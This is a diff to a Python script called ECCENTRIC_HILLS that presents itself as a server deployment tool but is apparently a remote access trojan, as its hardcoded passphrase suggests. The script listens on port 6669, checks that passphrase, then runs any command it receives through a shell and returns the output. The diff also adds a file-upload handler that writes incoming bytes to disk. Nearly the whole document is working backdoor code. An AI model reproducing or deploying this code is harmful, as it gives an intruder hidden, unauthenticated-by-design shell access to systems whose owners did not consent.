@@ -1,6 +1,8 @@
-#ECCENTRIC_HILLS - *NIX Server Deployment Binary
-#Written by Gunnar Jones - @gunSec and Austin Crinkaw - @acrinklaw
-#https://github.com/gunSec/eccentric_hills
+"""
+ECCENTRIC_HILLS - *NIX Server Deployment Binary
+Written by Gunnar Jones - @gunSec and Austin Crinkaw - @acrinklaw
+https://github.com/gunSec/eccentric_hills
+"""
 #grabbing our libraries
 import socket
 import threading
@@ -15,7 +17,7 @@ BINDPORT = 6669
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((BINDIP,BINDPORT))
 
-IP = subprocess.check_output("ifconfig",stderr=subprocess.
+IP = subprocess.check_output("ip a",stderr=subprocess.
 STDOUT, shell=True)
 IP = str(re.findall( r'[0-9]+(?:.[0-9]+){3}', IP)[0])
 
@@ -23,21 +25,23 @@ IP = str(re.findall( r'[0-9]+(?:.[0-9]+){3}', IP)[0])
 server.listen(3)
 
 
+def upload(client_socket):
+    with open("./file", 'wb') as oh:
+        data = client_socket.recv(1024)
+        while data:
+            oh.write(data)
+            data = client_socket.recv(1024)
 
 
-def upload(clientSocket):
+def download(client_socket):
     i = 2 #Placeholder
 #client -> server
     #TODO THIS
 
-
-def download():
-    i = 1 #Placeholder
-#server -> client
-
-
-
-def commands(command):
+"""
+Method to handle parsing and execution of shell commands
+"""
+def commands(command, client_socket):
     command = command.rstrip()
     #Debug statement
     if command == "":
@@ -45,59 +49,59 @@ def commands(command):
     elif command[0] != "!":
         try:
             result =  subprocess.check_output(command,stderr=subprocess.
-STDOUT, shell=True)
+                                                STDOUT, shell=True)
             result = "\n" + result
             return result
         except:
             result = "\nCommand Indicated Failure.\n"
             return result
-
     elif command[0] == "!":
         command = command[1:]
         if command == "upload":
             #TODO WORK ON UPLOAD
-            upload(clientSocket)
+            upload(client_socket)
         elif command == 'download':
-            i = 3 #Placeholder
+            download(client_socket)
     else:
         sys.exit(1)
-##
-#main server functions, command parsing
-def shell(clientSocket):
+
+"""
+Provides main server functions, sends client response to shell commands
+"""
+def shell(client_socket):
     while True:
-        clientSocket.send("\nECHI %s> !!"%IP)
+        client_socket.send("\nECHI %s> !!"%IP)
         buffer = ""
         while "\n" not in buffer:
-            buffer += clientSocket.recv(1024)
+            buffer += client_socket.recv(1024)
         if "quit" in buffer:
-            clientSocket.close()
+            client_socket.close()
             break
         else:
-            response = commands(buffer)
+            response = commands(buffer, client_socket)
             try:
-
-                clientSocket.send(response)
+                client_socket.send(response)
             except:
                 continue
 
-
-#Client Handler, require predetermined hash/passphrase to establish connection
-def handleClient(clientSocket):
-    hashpass = clientSocket.recv(1024)
+"""
+Client handler, require predetermined hash or passphrase to establish connection
+"""
+def handle_client(client_socket):
+    hashpass = client_socket.recv(1024)
     if hashpass == 'gunclawpythonratniBBa':
         #send the w and uname to client, jump to shell loop
-        clientSocket.send("\n[+] Accepted Connection\n")
-        shell(clientSocket)
+        client_socket.send("\n[+] Accepted Connection\n")
+        shell(client_socket)
     else:
-        clientSocket.close()
+        client_socket.close()
 
 
-#Main, waiting for connection loop
 def main():
     while True:
         client,addr = server.accept()
-        clientHandler = threading.Thread(target=handleClient,args=(client,))
-        clientHandler.start()
+        client_handler = threading.Thread(target=handle_client,args=(client,))
+        client_handler.start()
 
 
 if __name__ == '__main__':
